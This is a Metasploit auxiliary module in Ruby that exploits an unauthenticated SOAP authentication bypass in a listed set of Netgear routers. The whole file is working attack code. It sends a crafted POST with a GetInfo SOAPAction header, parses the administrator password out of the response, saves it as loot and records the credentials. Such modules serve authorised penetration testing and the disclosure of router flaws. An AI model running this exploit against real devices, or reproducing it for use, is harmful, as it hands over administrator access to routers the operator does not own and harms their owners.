##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Netgear Unauthenticated SOAP Password Extractor',
      'Description' => %q{
          This module exploits an authentication bypass vulnerability in different
        Netgear devices. With this vulnerability you are able to extract the password
        for the remote management. The following devices are reported as vulnerable:
        NetGear WNDR3700v4 - V1.0.0.4SH, NetGear WNDR3700v4 - V1.0.1.52, NetGear WNR2200 - V1.0.1.88
        NetGear WNR2500 - V1.0.0.24, NetGear WNDR3700v2 - V1.0.1.14 (Tested by Paula Thomas)
        NetGear WNDR3700v1 - V1.0.16.98 (Tested by Michal Bartoszkiewicz)
        NetGear WNDR3700v1 - V1.0.7.98 (Tested by Michal Bartoszkiewicz)
        NetGear WNDR4300 - V1.0.1.60 (Tested by Ronny Lindner)
        NetGear R6300v2 - V1.0.3.8 (Tested by Robert Mueller)
        NetGear WNDR3300 - V1.0.45 (Tested by Robert Mueller)
        NetGear WNDR3800 - V1.0.0.48 (Tested by an Anonymous contributor)
        NetGear WNR1000v2 - V1.0.1.1 (Tested by Jimi Sebree)
        NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton)
      },
      'References'  =>
        [
          [ 'URL', 'https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR' ]
        ],
      'Author'      =>
        [
          'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
          'Michael Messner <devnull[at]s3cur1ty.de>'	     # Metasploit module
        ],
      'License'     => MSF_LICENSE
    )
  end

  def run
    print_status("#{rhost}:#{rport} - Trying to access the configuration of the device")

    soapaction = "urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo"

    print_status("Sending exploit to victim.")
    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'              => "/",
        'headers' => {
          'SOAPAction' => soapaction,
        },
        'data'            => "=",
      })

      return if res.nil?
      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /Linux\/2.6.15 uhttpd\/1.0.0 soap\/1.0/)
      return if (res.code == 404)


      if res.body =~ /<NewPassword>(.*)<\/NewPassword>/
        print_good("#{peer} - credentials successfully extracted")

        #store all details as loot -> there is some usefull stuff in the response
        loot = store_loot("netgear_soap_accoutn.config","text/plain",rhost, res.body)
        print_good("#{peer} - Account details downloaded to: #{loot}")

        res.body.each_line do |line|
          if line =~ /<NewPassword>(.*)<\/NewPassword>/
            pass = $1
            vprint_good("user: admin")
            vprint_good("pass: #{pass}")

            report_auth_info(
              :host => rhost,
              :port => rport,
              :sname => 'http',
              :user => 'admin',
              :pass => pass,
              :active => true
            )
          end
        end
      end
    rescue ::Rex::ConnectionError
      vprint_error("#{peer} - Failed to connect to the web server")
      return
    end


  end
end
